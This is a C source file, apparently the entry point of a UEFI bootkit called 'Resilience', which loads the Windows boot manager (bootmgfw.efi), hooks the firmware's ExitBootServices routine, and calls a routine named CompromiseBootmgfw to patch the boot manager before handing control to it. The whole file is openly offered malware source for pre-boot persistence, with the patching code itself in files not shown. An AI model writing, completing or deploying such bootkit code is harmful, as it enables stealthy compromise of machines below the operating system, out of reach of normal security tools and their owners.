#include <Uefi.h>
#include <Base.h>

#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>

#include "globals.h"
#include "utils.h"
#include "hook.h"

#define SPLASH	L" _____         _ _ _\n\r"						\
				L"| __  |___ ___|_| |_|___ ___ ___ ___\n\r"		\
				L"|    -| -_|_ -| | | | -_|   |  _| -_|\n\r"	\
				L"|__|__|___|___|_|_|_|___|_|_|___|___|\n\r"	\
				L"0x00Alchemist (SKVLLZ.)\n\r"

// Some global stuff
CHAR8  *gEfiCallerBaseName = "ResilienceBootkit";
CONST UINT32 _gUefiDriverRevision = 0;
CONST UINT8  _gDriverUnloadImageCount = 0;

// Useless, but VisualUefi wants them
BOOLEAN mPostEBS = FALSE;
EFI_SYSTEM_TABLE *mDebugST = NULL;

VOID *OriginalExitBootServicesAddress;


EFI_STATUS
EFIAPI
HkExitBootServices(
	IN EFI_HANDLE ImageHandle,
	IN UINTN	  MapKey
) {
	EFI_STATUS GlobalStatus = OsGlobalPatch.PatchStatus;

	gST->ConOut->ClearScreen(gST->ConOut);

	// Ensure if everything ok.
	if(EFI_ERROR(GlobalStatus)) {
		gST->ConOut->SetAttribute(gST->ConOut, (EFI_RED | EFI_BACKGROUND_BLACK));

		Print(L"[!!] Resilience received EFI_STATUS: 0x%llx | %r\n\r", GlobalStatus, GlobalStatus);
		Print(L"[!!] Message: %s\n\r", OsGlobalPatch.Message);
		Print(L"[!!] Exception address: 0x%llx\n\r\n\r", OsGlobalPatch.ExceptionAddress);
		Print(L"[!!] Resetting system after 10 seconds!");

		Sleep(10);

		// Because we can do it.
		gRS->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
	} 

	Print(L"[+] Success! Moving to RT phase..\n\r");

	gBS->ExitBootServices = OriginalExitBootServicesAddress;
	return gBS->ExitBootServices(ImageHandle, MapKey);
}

// useless
EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
) {
	return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE			ImageHandle,
	IN EFI_SYSTEM_TABLE		*SysTable
) {
	gST = SysTable;
	gBS = SysTable->BootServices;
	gRS = SysTable->RuntimeServices;

	gST->ConOut->ClearScreen(gST->ConOut);
	gST->ConOut->SetAttribute(gST->ConOut, (EFI_YELLOW | EFI_BACKGROUND_BLACK));

	// Pretty
	gST->ConOut->OutputString(gST->ConOut, SPLASH);

	// Default error code
	EFI_STATUS Status = EFI_NOT_FOUND;

	Print(L"\n\r[ Resilience bootkit ]\n\r\n\r");
	Print(L"[+] Resilience initialized at address: 0x%llx\n\r", ImageHandle);

	// Get windows bootmanager device path protocol and load it
	CHAR16 *BootmgfwPath = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
	EFI_DEVICE_PATH *BootmgfwDevice = GetBootmanagerDevicePath(BootmgfwPath);
	if(BootmgfwDevice == NULL) {
		Print(L"[!] Cannot locate \"bootmgfw.efi\" device path protocol!");

		return Status;
	}

	// Just load bootmanager image
	EFI_HANDLE BootmgfwHandle;
	Status = gBS->LoadImage(TRUE, gImageHandle, BootmgfwDevice, NULL, 0, &BootmgfwHandle);
	if(EFI_ERROR(Status)) {
		Print(L"[!] Resilience cannot load \"bootmgfw.efi\" device!\n\r");
		
		return Status;
	}

	Print(L"[+] Hooking gBS->ExitBootServices, then start installing hook chains\n\r");

	// Hook gBS->ExitBootServices. Easy way to detect errors.
	OriginalExitBootServicesAddress = gBS->ExitBootServices;
	gBS->ExitBootServices = (VOID *)HkExitBootServices;

	// Make sure user will read everything (1337iq move)
	Sleep(5);

	gST->ConOut->ClearScreen(gST->ConOut);

	// Now, Resilience will install hook at bootmgfw.efi
	Status = CompromiseBootmgfw(BootmgfwHandle);
	if(EFI_ERROR(Status)) {
		Print(L"[!] Cannot install bootmanager hooks!\n\r");
		gBS->UnloadImage(BootmgfwHandle);

		gBS->ExitBootServices = OriginalExitBootServicesAddress;

		return Status;
	}

	// Start bootmanager image
	Status = gBS->StartImage(BootmgfwHandle, NULL, NULL);
	if(EFI_ERROR(Status)) {
		Print(L"[!] Cannot start bootmanager!\n\r");
		gBS->UnloadImage(BootmgfwHandle);

		gBS->ExitBootServices = OriginalExitBootServicesAddress;

		return Status;
	}

	return Status;
}